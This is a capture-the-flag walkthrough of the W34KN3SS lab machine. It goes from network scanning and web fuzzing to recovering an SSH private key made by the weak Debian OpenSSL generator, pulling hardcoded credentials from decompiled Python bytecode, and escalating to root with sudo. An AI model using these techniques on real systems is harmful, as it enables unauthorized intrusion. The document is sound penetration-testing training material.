@@ -1,0 +1,298 @@
+I"�Y<p>This machine was made for Jordan’s Top hacker 2018 CTF , was tried to simulate a real world attacks “as much as possible” in order to improve your penetration testing skills.</p>
+
+<h2 id="information-gathering">Information Gathering</h2>
+<h3 id="host-discovery">Host Discovery</h3>
+
+<p>With netdiscover I discovered the target machine on the local network.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/w34kn3ss<span class="nv">$ </span>netdiscover <span class="nt">-i</span> vmnet1 <span class="nt">-r</span> 192.168.179.1/24
+ Currently scanning: Finished!   |   Screen View: Unique Hosts
+
+ 5 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 282
+ _____________________________________________________________________________
+   IP            At MAC Address     Count     Len  MAC Vendor / Hostname
+ <span class="nt">-----------------------------------------------------------------------------</span>
+ 192.168.179.155 00:0c:29:47:ee:c9      4     240  VMware, Inc.
+ 192.168.179.254 00:50:56:e2:86:af      1      42  VMware, Inc.
+</code></pre></div></div>
+
+<h3 id="port-scanning">Port Scanning</h3>
+
+<p>Then I performed a full TCP/UDP scan to discover open ports.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/w34kn3ss<span class="nv">$ </span>us <span class="nt">-mT</span> <span class="nt">-Iv</span> 192.168.179.155:a <span class="nt">-r</span> 3000 <span class="nt">-R</span> 3 <span class="o">&amp;&amp;</span> us <span class="nt">-mU</span> <span class="nt">-Iv</span> 192.168.179.155:a <span class="nt">-r</span> 3000 <span class="nt">-R</span> 3
+adding 192.168.179.155/32 mode <span class="sb">`</span>TCPscan<span class="s1">' ports `a'</span> pps 3000
+...
+listener statistics 393590 packets recieved 0 packets droped and 0 interface drops
+TCP open                     ssh[   22]         from 192.168.179.155  ttl 64 
+TCP open                    http[   80]         from 192.168.179.155  ttl 64 
+TCP open                   https[  443]         from 192.168.179.155  ttl 64
+...
+UDP open 192.168.179.155:35626  ttl 64
+listener statistics 316 packets recieved 0 packets droped and 0 interface drops
+UDP open                 unknown[33731]         from 192.168.179.155  ttl 64 
+UDP open                 unknown[34201]         from 192.168.179.155  ttl 64 
+UDP open                 unknown[35626]         from 192.168.179.155  ttl 64 
+UDP open                 unknown[35798]         from 192.168.179.155  ttl 64 
+UDP open                 unknown[36209]         from 192.168.179.155  ttl 64 
+UDP open                 unknown[38441]         from 192.168.179.155  ttl 64 
+UDP open                 unknown[38796]         from 192.168.179.155  ttl 64 
+UDP open                 unknown[39640]         from 192.168.179.155  ttl 64 
+UDP open                 unknown[46188]         from 192.168.179.155  ttl 64 
+UDP open                 unknown[49120]         from 192.168.179.155  ttl 64 
+UDP open                 unknown[50626]         from 192.168.179.155  ttl 64 
+UDP open                 unknown[52569]         from 192.168.179.155  ttl 64 
+UDP open                 unknown[59185]         from 192.168.179.155  ttl 64
+</code></pre></div></div>
+
+<h3 id="service-enumeration">Service Enumeration</h3>
+
+<p>I focused on performing the service enumeration of the open ports and escript scanning on the target.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/w34kn3ss<span class="nv">$ </span>nmap <span class="nt">-v</span> <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-p22</span>,80,443 192.168.179.155 <span class="nt">-oN</span> nmap/service-enum.txt
+...
+PORT    STATE SERVICE  VERSION                                
+22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span> 
+| ssh-hostkey:                                                     
+|   2048 de:89:a2:de:45:e7:d6:3d:ef:e9:bd:b4:b6:68:ca:6d <span class="o">(</span>RSA<span class="o">)</span>  
+|   256 1d:98:4a:db:a2:e0:cc:68:38:93:d0:52:2a:1a:aa:96 <span class="o">(</span>ECDSA<span class="o">)</span>  
+|_  256 3d:8a:6b:92:0d:ba:37:82:9e:c3:27:18:b6:01:cd:98 <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp  open  http     Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
+| http-methods: 
+|_  Supported Methods: OPTIONS HEAD GET POST
+|_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: Apache2 Ubuntu Default Page: It works
+443/tcp open  ssl/http Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: 400 Bad Request
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>weakness.jth/organizationName<span class="o">=</span>weakness.jth/stateOrProvinceName<span class="o">=</span>Jordan/countryName<span class="o">=</span>jo
+| Issuer: <span class="nv">commonName</span><span class="o">=</span>weakness.jth/organizationName<span class="o">=</span>weakness.jth/stateOrProvinceName<span class="o">=</span>Jordan/countryName<span class="o">=</span>jo
+| Public Key <span class="nb">type</span>: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2018-05-05T11:12:54
+| Not valid after:  2019-05-05T11:12:54
+| MD5:   f921 c4be 2c6e 89d6 adaf a7c2 8f39 a87d
+|_SHA-1: 0b44 5a28 c4da 0bf8 b308 a782 4081 1218 101e 0feb
+|_ssl-date: TLS randomness does not represent <span class="nb">time</span>
+| tls-alpn: 
+|_  http/1.1
+</code></pre></div></div>
+
+<h3 id="web-enumeration">Web Enumeration</h3>
+
+<p>I decided to interact with the web service but a first glance I couldn’t find anything.</p>
+
+<p><img src="/assets/images/w34kn3ss/screenshot-1.png" alt="" /></p>
+
+<p>So I run wfuzz to find hidden web directories.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/w34kn3ss<span class="nv">$ </span>wfuzz <span class="nt">-c</span> <span class="nt">--hc</span> 404 <span class="nt">-z</span> file,/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt http://192.168.179.155/FUZZ
+...
+000000032:   301        9 L      28 W       317 Ch      <span class="s2">"blog"</span>   
+000000164:   301        9 L      28 W       320 Ch      <span class="s2">"uploads"</span>  
+000000611:   301        9 L      28 W       317 Ch      <span class="s2">"test"</span>
+000095524:   403        11 L     32 W       303 Ch      <span class="s2">"server-status"</span>
+</code></pre></div></div>
+
+<p>The test directory contains an image, but nothing important.</p>
+
+<p><img src="/assets/images/w34kn3ss/screenshot-2.png" alt="" /></p>
+
+<p>I created a file with some extensions and ran wfuzz again.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/w34kn3ss<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'html'</span> <span class="o">&gt;</span> extensions.txt
+root@kali:~/w34kn3ss<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'php'</span> <span class="o">&gt;&gt;</span> extensions.txt
+root@kali:~/w34kn3ss<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'txt'</span> <span class="o">&gt;&gt;</span> extensions.txt
+
+root@kali:~/w34kn3ss<span class="nv">$ </span>wfuzz <span class="nt">-c</span> <span class="nt">--hc</span> 404 <span class="nt">-z</span> file,/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt <span class="nt">-z</span> file,extensions.txt http://192.168.179.155/FUZZ.FUZ2Z
+...
+000000043:   200        375 L    964 W      10918 Ch    <span class="s2">"index - html"</span>                                                                                      
+000001097:   200        9 L      16 W       216 Ch      <span class="s2">"upload - php"</span>
+</code></pre></div></div>
+
+<p>The result of this enumeration returned an upload.php file, this likes interesting.</p>
+
+<p><img src="/assets/images/w34kn3ss/screenshot-3.png" alt="" /></p>
+
+<p>I tested this to find a way to upload a file but nothing, this returns a base64 string I decoded it but the message doesn’t say anything important.</p>
+
+<p><img src="/assets/images/w34kn3ss/screenshot-4.png" alt="" /></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/w34kn3ss<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'V0UgSlVTVCBURVNUIFRISVMgU0NSSVBUV0UgSlVTVCBURVNUIFRISVMgU0NSSVBUIEFHQUlOIDpE'</span> | <span class="nb">base64</span> <span class="nt">-d</span>
+WE JUST TEST THIS SCRIPTWE JUST TEST THIS SCRIPT AGAIN :D
+</code></pre></div></div>
+
+<p>Listing the source code with the browser I saw a comment <strong>Not everything you see is real, maybe it’s just an illusion ;)</strong>, probably this is a rabbit hole.</p>
+
+<p><img src="/assets/images/w34kn3ss/screenshot-5.png" alt="" /></p>
+
+<h3 id="ssl-enumeration">SSL Enumeration</h3>
+
+<p>I connected with openssl on port 443 and discovered a domain name and an email.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/w34kn3ss<span class="nv">$ </span>openssl s_client <span class="nt">-connect</span> 192.168.179.155:443 
+CONNECTED<span class="o">(</span>00000003<span class="o">)</span>                   
+Can<span class="s1">'t use SSL_get_servername     
+depth=0 C = jo, ST = Jordan, L = Amman, O = weakness.jth, CN = weakness.jth, emailAddress = n30@weakness.jth
+verify error:num=18:self signed certificate     
+verify return:1 
+...
+</span></code></pre></div></div>
+
+<p>I saved the domain name in the system hosts file.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/w34kn3ss<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'192.168.179.155 weakness.jth'</span> <span class="o">&gt;&gt;</span> /etc/hosts
+</code></pre></div></div>
+
+<p>I requested this domain name with the browser and this redirected me to the following page.</p>
+
+<p><img src="/assets/images/w34kn3ss/screenshot-6.png" alt="" /></p>
+
+<p>I ran wfuzz to find web directories again.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/w34kn3ss<span class="nv">$ </span>wfuzz <span class="nt">-c</span> <span class="nt">--hc</span> 404 <span class="nt">-z</span> file,/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt http://weakness.jth/FUZZ
+...
+000001003:   301        9 L      28 W       314 Ch      <span class="s2">"private"</span>
+</code></pre></div></div>
+
+<p>The private directory contains a public key and a note contains a public key and a note.</p>
+
+<p><img src="/assets/images/w34kn3ss/screenshot-7.png" alt="" /></p>
+
+<p>So I downloaded the public key, in the note we can see that the key was generated by a vulnerable version of openssl.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/w34kn3ss<span class="nv">$ </span>wget http://weakness.jth/private/files/mykey.pub
+</code></pre></div></div>
+
+<p><img src="/assets/images/w34kn3ss/screenshot-8.png" alt="" /></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/w34kn3ss<span class="nv">$ </span>searchsploit openssl 0.9.8c-1
+<span class="nt">------------------------------------------------------------------------------------------------</span> <span class="nt">------------------------</span>
+ Exploit Title                                                                                  |  Path
+<span class="nt">------------------------------------------------------------------------------------------------</span> <span class="nt">------------------------</span>
+OpenSSL 0.9.8c-1 &lt; 0.9.8g-9 <span class="o">(</span>Debian and Derivatives<span class="o">)</span> - Predictable PRNG Brute Force SSH         | linux/remote/5622.txt
+OpenSSL 0.9.8c-1 &lt; 0.9.8g-9 <span class="o">(</span>Debian and Derivatives<span class="o">)</span> - Predictable PRNG Brute Force SSH         | linux/remote/5720.py
+OpenSSL 0.9.8c-1 &lt; 0.9.8g-9 <span class="o">(</span>Debian and Derivatives<span class="o">)</span> - Predictable PRNG Brute Force SSH <span class="o">(</span>Ruby<span class="o">)</span>  | linux/remote/5632.rb
+<span class="nt">------------------------------------------------------------------------------------------------</span> <span class="nt">------------------------</span>
+</code></pre></div></div>
+
+<h2 id="exploitation">Exploitation</h2>
+<h3 id="openssl">OpenSSL</h3>
+
+<p>This openssl version is vulnerable to <strong>Predictable PRNG Brute Force SSH</strong>, it’s that the debian openssl issue leads that there are only 65.536 possible ssh 
+keys generated, cause the only entropy is the pid of the process generating the key.</p>
+
+<p>Reading the exploit proof of concept, This indicates that you have to download a compressed file with all the generated keys, so I download it and decompress it.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/w34kn3ss<span class="nv">$ </span>wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/5622.tar.bz2
+
+root@kali:~/w34kn3ss<span class="nv">$ </span><span class="nb">tar </span>xvf 5622.tar.bz2
+</code></pre></div></div>
+
+<p>Then I did a grep with the public key to find the private key.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/w34kn3ss<span class="nv">$ </span><span class="nb">grep</span> <span class="nt">-lr</span> AAAAB3NzaC1yc2EAAAABIwAAAQEApC39uhie9gZahjiiMo+k8DOqKLujcZMN1bESzSLT8H5jRGj8n1FFqjJw27Nu5JYTI73Szhg/uoeMOfECHNzGj7GtoMqwh38clgVjQ7Qzb47/kguAeWMUcUHrCBz9KsN+7eNTb5cfu0O0QgY+DoLxuwfVufRVNcvaNyo0VS1dAJWgDnskJJRD+46RlkUyVNhwegA0QRj9Salmpssp+z5wq7KBPL1S982QwkdhyvKg3dMy29j/C5sIIqM/mlqilhuidwo1ozjQlU2+yAVo5XrWDo0qVzzxsnTxB5JAfF7ifoDZp2yczZg+ZavtmfItQt1Vac1vSuBPCpTqkjE/4Iklgw rsa/
+rsa/2048/4161de56829de2fe64b9055711f531c1-2537.pub
+</code></pre></div></div>
+
+<h3 id="access-via-ssh">Access via SSH</h3>
+
+<p>I log in to SSH with the key found and I captured the first flag.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/w34kn3ss<span class="nv">$ </span>ssh n30@192.168.179.155 <span class="nt">-i</span> rsa/2048/4161de56829de2fe64b9055711f531c1-2537
+Welcome to Ubuntu 18.04 LTS <span class="o">(</span>GNU/Linux 4.15.0-20-generic x86_64<span class="o">)</span>
+
+ <span class="k">*</span> Documentation:  https://help.ubuntu.com
+ <span class="k">*</span> Management:     https://landscape.canonical.com
+ <span class="k">*</span> Support:        https://ubuntu.com/advantage
+
+Last login: Tue Aug 14 13:29:20 2018 from 192.168.209.1
+n30@W34KN3SS:~<span class="nv">$ </span><span class="nb">ls
+</span>code  user.txt
+n30@W34KN3SS:~<span class="nv">$ </span><span class="nb">cat </span>user.txt 
+25e3cd678875b601425c9356c8039f68
+</code></pre></div></div>
+
+<p>In the n30’s home directory there’s a file called code, this is a compiled python file that generates a hash.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>n30@W34KN3SS:~<span class="nv">$ </span>file code 
+code: python 2.7 byte-compiled
+n30@W34KN3SS:~<span class="nv">$ </span>python code
+<span class="o">[</span>+]System Started at : Wed Oct 13 20:05:23 2021
+<span class="o">[</span>+]This binary should generate unique <span class="nb">hash </span><span class="k">for </span>the hardcoded login info
+<span class="o">[</span>+]Generating the <span class="nb">hash</span> ..
+<span class="o">[</span>+]Your new <span class="nb">hash </span>is : fa82870b0487f9a92a4cc089e989f4e97a61a8da9fe1ff856c75ada3039030c3
+<span class="o">[</span>+]Done
+</code></pre></div></div>
+
+<p>I Downloaded this file to the attacking machine to analyze it.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/w34kn3ss<span class="nv">$ </span>scp <span class="nt">-i</span> rsa/2048/4161de56829de2fe64b9055711f531c1-2537 n30@192.168.179.155:code <span class="nb">.</span>
+code                                                                     100% 1138   352.7KB/s   00:00
+</code></pre></div></div>
+
+<p>There’s a way to decompile these types of files, for this I used <strong>uncompyle2</strong>, you can dowanload it <a href="https://github.com/Mysterie/uncompyle2">here</a>, or use an online python <a href="https://www.toolnb.com/tools-lang-en/pyc.html">decompiler</a>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/w34kn3ss<span class="nv">$ </span>uncompyle2 code 
+<span class="c"># 2021.10.13 21:17:40 -05</span>
+<span class="c"># Embedded file name: code.py</span>
+import os
+import socket
+import <span class="nb">time
+</span>import hashlib
+print <span class="s1">'[+]System Started at : {0}'</span>.format<span class="o">(</span>time.ctime<span class="o">())</span>
+print <span class="s1">'[+]This binary should generate unique hash for the hardcoded login info'</span>
+print <span class="s1">'[+]Generating the hash ..'</span>
+inf <span class="o">=</span> <span class="s1">''</span>
+inf +<span class="o">=</span> chr<span class="o">(</span>ord<span class="o">(</span><span class="s1">'n'</span><span class="o">))</span>
+inf +<span class="o">=</span> chr<span class="o">(</span>ord<span class="o">(</span><span class="s1">'3'</span><span class="o">))</span>
+inf +<span class="o">=</span> chr<span class="o">(</span>ord<span class="o">(</span><span class="s1">'0'</span><span class="o">))</span>
+inf +<span class="o">=</span> chr<span class="o">(</span>ord<span class="o">(</span><span class="s1">':'</span><span class="o">))</span>
+inf +<span class="o">=</span> chr<span class="o">(</span>ord<span class="o">(</span><span class="s1">'d'</span><span class="o">))</span>
+inf +<span class="o">=</span> chr<span class="o">(</span>ord<span class="o">(</span><span class="s1">'M'</span><span class="o">))</span>
+inf +<span class="o">=</span> chr<span class="o">(</span>ord<span class="o">(</span><span class="s1">'A'</span><span class="o">))</span>
+inf +<span class="o">=</span> chr<span class="o">(</span>ord<span class="o">(</span><span class="s1">'S'</span><span class="o">))</span>
+inf +<span class="o">=</span> chr<span class="o">(</span>ord<span class="o">(</span><span class="s1">'D'</span><span class="o">))</span>
+inf +<span class="o">=</span> chr<span class="o">(</span>ord<span class="o">(</span><span class="s1">'N'</span><span class="o">))</span>
+inf +<span class="o">=</span> chr<span class="o">(</span>ord<span class="o">(</span><span class="s1">'B'</span><span class="o">))</span>
+inf +<span class="o">=</span> chr<span class="o">(</span>ord<span class="o">(</span><span class="s1">'!'</span><span class="o">))</span>
+inf +<span class="o">=</span> chr<span class="o">(</span>ord<span class="o">(</span><span class="s1">'!'</span><span class="o">))</span>
+inf +<span class="o">=</span> chr<span class="o">(</span>ord<span class="o">(</span><span class="s1">'#'</span><span class="o">))</span>
+inf +<span class="o">=</span> chr<span class="o">(</span>ord<span class="o">(</span><span class="s1">'B'</span><span class="o">))</span>
+inf +<span class="o">=</span> chr<span class="o">(</span>ord<span class="o">(</span><span class="s1">'!'</span><span class="o">))</span>
+inf +<span class="o">=</span> chr<span class="o">(</span>ord<span class="o">(</span><span class="s1">'#'</span><span class="o">))</span>
+inf +<span class="o">=</span> chr<span class="o">(</span>ord<span class="o">(</span><span class="s1">'!'</span><span class="o">))</span>
+inf +<span class="o">=</span> chr<span class="o">(</span>ord<span class="o">(</span><span class="s1">'#'</span><span class="o">))</span>
+inf +<span class="o">=</span> chr<span class="o">(</span>ord<span class="o">(</span><span class="s1">'3'</span><span class="o">))</span>
+inf +<span class="o">=</span> chr<span class="o">(</span>ord<span class="o">(</span><span class="s1">'3'</span><span class="o">))</span>
+hashf <span class="o">=</span> hashlib.sha256<span class="o">(</span>inf + time.ctime<span class="o">())</span>.hexdigest<span class="o">()</span>
+print <span class="s1">'[+]Your new hash is : {0}'</span>.format<span class="o">(</span>hashf<span class="o">)</span>
+print <span class="s1">'[+]Done'</span>
+<span class="c"># okay decompyling code </span>
+<span class="c"># decompiled 1 files: 1 okay, 0 failed, 0 verify failed</span>
+</code></pre></div></div>
+
+<p>As we can see the source code is in plain text and was possible recover the n30’s credentials.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>n30:dMASDNB!!#B!#!#33
+</code></pre></div></div>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="sudoers-group">Sudoers Group</h3>
+
+<p>As we can see, n30 belongs to the sudoers group, so I ran the following command and entered the password and we get root.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>n30@W34KN3SS:~<span class="nv">$ </span><span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>n30<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>n30<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>n30<span class="o">)</span>,4<span class="o">(</span>adm<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,27<span class="o">(</span><span class="nb">sudo</span><span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,111<span class="o">(</span>lpadmin<span class="o">)</span>,112<span class="o">(</span>sambashare<span class="o">)</span>
+n30@W34KN3SS:~<span class="nv">$ </span><span class="nb">sudo </span>su
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>n30: 
+root@W34KN3SS:/home/n30# <span class="nb">cd 
+</span>root@W34KN3SS:~# <span class="nb">ls
+</span>root.txt
+root@W34KN3SS:~# <span class="nb">cat </span>root.txt 
+a1d2fab76ec6af9b651d4053171e042e
+</code></pre></div></div>
+:ET
